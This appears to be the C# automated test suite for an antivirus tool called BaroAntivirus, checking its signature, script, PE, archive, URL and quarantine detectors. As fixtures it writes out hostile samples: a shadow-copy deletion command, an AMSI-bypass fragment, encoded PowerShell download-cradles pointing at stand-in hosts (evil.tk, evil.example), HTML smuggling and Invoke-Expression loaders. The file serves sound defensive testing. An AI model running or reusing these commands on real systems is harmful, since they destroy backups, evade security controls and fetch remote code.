using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;
using BaroAntivirus.Core.Detection;
using BaroAntivirus.Core.Models;
using BaroAntivirus.Core.Services;

namespace BaroAntivirus.Tests;

internal static class Program
{
    private static int _passed;
    private static int _failed;

    private static string BuildEicar() => string.Concat(
        "X5O!P%",
        "@AP[4\\PZX54",
        "(P^)7CC)7}$",
        "EICAR-STANDARD-",
        "ANTIVIRUS-TEST-FILE!",
        "$H+H*");

    private static async Task<int> Main()
    {
        string tempRoot = Path.Combine(Path.GetTempPath(), "BaroAntivirus_TestSuite_" + Guid.NewGuid().ToString("N")[..8]);
        Directory.CreateDirectory(tempRoot);

        try
        {
            Console.WriteLine("=== BaroAntivirus Automated Verification Suite ===");

            RunTest("EntropyCalculator: Low vs High Entropy", () =>
            {
                byte[] low = Encoding.ASCII.GetBytes(new string('A', 4096));
                byte[] high = new byte[4096];
                RandomNumberGenerator.Fill(high);

                double eLow = EntropyCalculator.ComputeBytesEntropy(low);
                double eHigh = EntropyCalculator.ComputeBytesEntropy(high);
                Assert(eLow < 0.1, $"Expected low entropy < 0.1, got {eLow}");
                Assert(eHigh > 7.8, $"Expected high entropy > 7.8, got {eHigh}");
            });

            RunTest("SignatureDatabase: EICAR, Ransomware & AMSI Bypass", () =>
            {
                var db = new SignatureDatabase();
                var hits = db.ScanContentBytes(Encoding.ASCII.GetBytes(BuildEicar()));
                Assert(hits.Any(h => h.ThreatName.Contains("EICAR", StringComparison.OrdinalIgnoreCase)), "EICAR not detected");

                string ransomCmd = string.Concat("cmd /c vss", "admin del", "ete shad", "ows /all /quiet");
                var ransomHits = db.ScanContentBytes(Encoding.ASCII.GetBytes(ransomCmd));
                Assert(ransomHits.Any(h => h.Category == ThreatCategory.RansomwareBehavior), "Ransomware vssadmin not detected");

                string amsiCmd = string.Concat("[Ref].Assembly.GetType('System.Management.Automation.Am", "siUtils').GetField('am", "siInitFailed')");
                var amsiHits = db.ScanContentBytes(Encoding.ASCII.GetBytes(amsiCmd));
                Assert(amsiHits.Any(h => h.ThreatName.Contains("AmsiBypass")), "AMSI bypass not detected");
            });

            RunTest("ScriptAndDocumentAnalyzer: Masquerading, RLO, PowerShell, HTML Smuggling & LNK", () =>
            {
                var (s1, _) = ScriptAndDocumentAnalyzer.CheckFilenameMasquerading("invoice_2026.pdf.exe");
                Assert(s1 >= 75, $"Double extension score too low: {s1}");

                var (s2, _) = ScriptAndDocumentAnalyzer.CheckFilenameMasquerading("photo\u202Egpj.exe");
                Assert(s2 >= 80, $"RLO spoofing score too low: {s2}");

                string psBody = string.Concat(
                    "powershell -w hidden -EncodedCommand ",
                    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAHQAawAnACkA");
                var ps = ScriptAndDocumentAnalyzer.AnalyzeScriptContent(psBody, ".ps1");
                Assert(ps.RiskScore >= 60, $"PowerShell obfuscation score too low: {ps.RiskScore}");

                var html = ScriptAndDocumentAnalyzer.AnalyzeScriptContent(
                    "<script>const bytes = atob('TVqQAAMAAAA'); const b = new Blob([bytes], {type:'application/octet-stream'});</script>",
                    ".html");
                Assert(html.RiskScore >= 70, $"HTML smuggling not flagged: {html.RiskScore}");

                string lnkPath = Path.Combine(tempRoot, "fake_doc.lnk");
                var lnkBytes = new byte[128];
                lnkBytes[0] = 0x4C;
                lnkBytes[1] = 0x00;
                byte[] payload = Encoding.ASCII.GetBytes("powershell.exe -w hidden -enc AAA https://evil.example/drop.exe");
                Array.Copy(payload, 0, lnkBytes, 76, Math.Min(payload.Length, lnkBytes.Length - 76));
                File.WriteAllBytes(lnkPath, lnkBytes);

                var lnkRes = ScriptAndDocumentAnalyzer.AnalyzeFile(lnkPath);
                Assert(lnkRes.RiskScore >= 70, $"Malicious LNK not detected: {lnkRes.RiskScore}");
            });

            RunTest("PeAnalyzer: Synthetic Packed RWX PE32+ Detection", () =>
            {
                string pePath = Path.Combine(tempRoot, "packed_sample.exe");
                CreateSyntheticPackedPe(pePath);

                var pe = PeAnalyzer.Analyze(pePath);
                Assert(pe.IsValidPe, "Synthetic PE should parse as valid PE");
                Assert(pe.HasRwxSection, "RWX section should be detected");
                Assert(pe.HasPackerSection, "UPX packer section should be detected");
                Assert(pe.MaxSectionEntropy >= 7.2, $"Expected high section entropy, got {pe.MaxSectionEntropy}");
                Assert(pe.RiskScore >= 50, $"PE risk score too low: {pe.RiskScore}");
            });

            RunTest("ThreatDetectionEngine: Zone.Identifier Strict Internet Download Enforcement", () =>
            {
                var engine = new ThreatDetectionEngine(new SignatureDatabase());
                string dlExe = Path.Combine(tempRoot, "downloaded_unsigned.exe");
                CreateSyntheticPackedPe(dlExe, rwx: false, packerName: ".text", highEntropy: false);

                File.WriteAllText(dlExe + ":Zone.Identifier", "[ZoneTransfer]\r\nZoneId=3\r\nHostUrl=https://untrusted-site.example/app.exe\r\n");

                var zone = ZoneIdentifierReader.Read(dlExe);
                Assert(zone != null && zone.ZoneId == 3, "Zone.Identifier ADS was not read properly");

                var paranoidHit = engine.InspectFile(dlExe, StrictnessLevel.Paranoid, inspectArchives: false);
                Assert(paranoidHit != null, "Paranoid mode must block unsigned Internet executable");
            });

            RunTest("ArchiveInspector: Nested Masqueraded Exe & Malicious Script inside ZIP", () =>
            {
                string zipPath = Path.Combine(tempRoot, "dropper_bundle.zip");
                using (var archive = ZipFile.Open(zipPath, ZipArchiveMode.Create))
                {
                    var e1 = archive.CreateEntry("salary_report.pdf.exe");
                    using (var s = e1.Open()) s.Write(Encoding.ASCII.GetBytes("MZfake"));

                    var e2 = archive.CreateEntry("update.ps1");
                    using (var s = e2.Open())
                    {
                        string sc = string.Concat("Invoke-", "Expression ([System.Text.Encoding]::UTF8.GetString([Convert]::From", "Base64String('AAAA')))");
                        s.Write(Encoding.UTF8.GetBytes(sc));
                    }
                }

                var res = ArchiveInspector.InspectZip(zipPath, new SignatureDatabase(), isFromInternet: true);
                Assert(res.RiskScore >= 70, $"Archive threat score too low: {res.RiskScore}");
            });

            RunTest("UrlReputationAnalyzer: Phishing, Punycode, IP-Executable & Safe URL", () =>
            {
                var analyzer = new UrlReputationAnalyzer();

                var phish = analyzer.Analyze("https://vietcombank-xacthuc-24h.top/login");
                Assert(!phish.IsSafe && phish.RiskScore >= 70, $"Phishing URL missed: {phish.RiskScore}");

                var puny = analyzer.Analyze("https://xn--pypal-4ve.com/signin");
                Assert(!puny.IsSafe && puny.IsPunycode, "Punycode homograph missed");

                var ipExe = analyzer.Analyze("http://198.51.100.12/loader.exe");
                Assert(!ipExe.IsSafe && ipExe.IsIpLiteral, "IP literal executable URL missed");

                var safe = analyzer.Analyze("https://www.microsoft.com/en-us");
                Assert(safe.IsSafe, $"Safe official URL marked unsafe: {string.Join(", ", safe.Reasons)}");
            });

            RunTest("QuarantineService: AES-256-GCM Encrypt, Delete Original, Restore & Shred", () =>
            {
                string dataDir = Path.Combine(tempRoot, "BaroData");
                var qService = new QuarantineService(dataDir);
                string sample = Path.Combine(tempRoot, "quarantine_me.txt");
                byte[] originalBytes = Encoding.UTF8.GetBytes(BuildEicar());
                File.WriteAllBytes(sample, originalBytes);

                var finding = new ThreatFinding
                {
                    FilePath = sample,
                    FileName = Path.GetFileName(sample),
                    ThreatName = "EICAR-Test",
                    Category = ThreatCategory.MalwareSignature,
                    Severity = ThreatSeverity.Critical,
                    RiskScore = 100,
                    Sha256 = ThreatDetectionEngine.ComputeSha256(sample),
                    FileSize = originalBytes.Length
                };

                var entry = qService.QuarantineFile(finding);
                Assert(entry != null, "QuarantineFile returned null");
                Assert(!File.Exists(sample), "Original file must be removed after quarantine");

                bool restored = qService.RestoreEntry(entry!.Id, out string? restoredPath);
                Assert(restored && restoredPath != null && File.Exists(restoredPath), "Restore failed");
                byte[] restoredBytes = File.ReadAllBytes(restoredPath!);
                Assert(originalBytes.SequenceEqual(restoredBytes), "Restored bytes do not match original");

                Assert(FileShredderService.ShredFile(restoredPath!, passes: 3), "ShredFile failed");
                Assert(!File.Exists(restoredPath), "Shredded file still exists");
            });

            await RunTestAsync("RealtimeProtectionService & DeepScan End-to-End", async () =>
            {
                string dataDir = Path.Combine(tempRoot, "BaroRealtimeData");
                string watchDir = Path.Combine(tempRoot, "WatchFolder");
                string scanDir = Path.Combine(tempRoot, "DeepScanFolder");
                Directory.CreateDirectory(watchDir);
                Directory.CreateDirectory(scanDir);

                var logs = new SettingsAndLogService(dataDir);
                var settings = logs.LoadSettings();
                settings.Strictness = StrictnessLevel.Strict;
                settings.AutoQuarantineHighRisk = true;

                var engine = new ThreatDetectionEngine(new SignatureDatabase());
                var quarantine = new QuarantineService(dataDir);
                using var realtime = new RealtimeProtectionService(engine, quarantine, logs, settings);

                var interceptedTcs = new TaskCompletionSource<ThreatFinding>();
                realtime.ThreatIntercepted += f => interceptedTcs.TrySetResult(f);
                realtime.Start(new[] { watchDir });

                string droppedThreat = Path.Combine(watchDir, "eicar_realtime.txt");
                await File.WriteAllTextAsync(droppedThreat, BuildEicar());

                var completed = await Task.WhenAny(interceptedTcs.Task, Task.Delay(5000));
                Assert(completed == interceptedTcs.Task, "Realtime shield did not intercept threat within 5s");
                var hit = await interceptedTcs.Task;
                Assert(hit.ActionTaken == ProtectionAction.Quarantined, $"Expected Auto-Quarantined, got {hit.ActionTaken}");
                Assert(!File.Exists(droppedThreat), "Threat file still exists after real-time quarantine");

                await File.WriteAllTextAsync(Path.Combine(scanDir, "clean_notes.txt"), "Hello BaroAntivirus clean file.");
                await File.WriteAllTextAsync(Path.Combine(scanDir, "bad_script.ps1"), "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA");
                await File.WriteAllTextAsync(Path.Combine(scanDir, "eicar_deep.com"), BuildEicar());

                var scanner = new ScanService(engine, logs);
                var scanResult = await scanner.RunScanAsync(ScanMode.DeepScan, settings, new[] { scanDir });
                Assert(scanResult.FilesScanned == 3, $"Expected 3 files scanned, got {scanResult.FilesScanned}");
                Assert(scanResult.Findings.Count == 2, $"Expected 2 findings in DeepScan, got {scanResult.Findings.Count}");
            });

            RunTest("NetworkMonitor, StartupGuard & Lightweight Resource Metrics", () =>
            {
                var net = new NetworkMonitorService();
                var conns = net.GetActiveTcpConnections();
                Assert(conns != null, "Network connections returned null");

                var startup = new StartupGuardService();
                var entries = startup.InspectStartupEntries();
                Assert(entries != null, "Startup entries returned null");

                var opt = new ResourceOptimizer();
                var metrics = opt.SampleSelfMetrics();
                Console.WriteLine($"    [Resource Footprint] WorkingSet: {metrics.WorkingSetMB:F1} MB | Private: {metrics.PrivateMemoryMB:F1} MB");
                Assert(metrics.WorkingSetMB < 120, $"Memory footprint unexpectedly high: {metrics.WorkingSetMB} MB");
            });

            Console.WriteLine($"\nSummary: {_passed} passed, {_failed} failed.");
            return _failed == 0 ? 0 : 1;
        }
        finally
        {
            try { Directory.Delete(tempRoot, recursive: true); } catch { }
        }
    }

    private static void RunTest(string name, Action body)
    {
        try
        {
            body();
            _passed++;
            Console.WriteLine($"[PASS] {name}");
        }
        catch (Exception ex)
        {
            _failed++;
            Console.WriteLine($"[FAIL] {name}: {ex.Message}");
        }
    }

    private static async Task RunTestAsync(string name, Func<Task> body)
    {
        try
        {
            await body();
            _passed++;
            Console.WriteLine($"[PASS] {name}");
        }
        catch (Exception ex)
        {
            _failed++;
            Console.WriteLine($"[FAIL] {name}: {ex.Message}");
        }
    }

    private static void Assert(bool condition, string message)
    {
        if (!condition) throw new InvalidOperationException(message);
    }

    private static void CreateSyntheticPackedPe(string path, bool rwx = true, string packerName = "UPX0", bool highEntropy = true)
    {
        byte[] data = new byte[0x200 + 4096];
        data[0] = (byte)'M';
        data[1] = (byte)'Z';
        BitConverter.GetBytes(0x80).CopyTo(data, 0x3C);

        data[0x80] = (byte)'P';
        data[0x81] = (byte)'E';

        BitConverter.GetBytes((ushort)0x8664).CopyTo(data, 0x84);
        BitConverter.GetBytes((ushort)1).CopyTo(data, 0x86);
        BitConverter.GetBytes((ushort)240).CopyTo(data, 0x94);
        BitConverter.GetBytes((ushort)0x0022).CopyTo(data, 0x96);
        BitConverter.GetBytes((ushort)0x020B).CopyTo(data, 0x98);

        int secOff = 0x188;
        byte[] nameBytes = Encoding.ASCII.GetBytes(packerName.PadRight(8, '\0')[..8]);
        Array.Copy(nameBytes, 0, data, secOff, 8);
        BitConverter.GetBytes((uint)4096).CopyTo(data, secOff + 8);
        BitConverter.GetBytes((uint)0x1000).CopyTo(data, secOff + 12);
        BitConverter.GetBytes((uint)4096).CopyTo(data, secOff + 16);
        BitConverter.GetBytes((uint)0x200).CopyTo(data, secOff + 20);
        uint chars = rwx ? 0xE0000020u : 0x60000020u;
        BitConverter.GetBytes(chars).CopyTo(data, secOff + 36);

        if (highEntropy)
        {
            RandomNumberGenerator.Fill(data.AsSpan(0x200, 4096));
        }

        File.WriteAllBytes(path, data);
    }
}
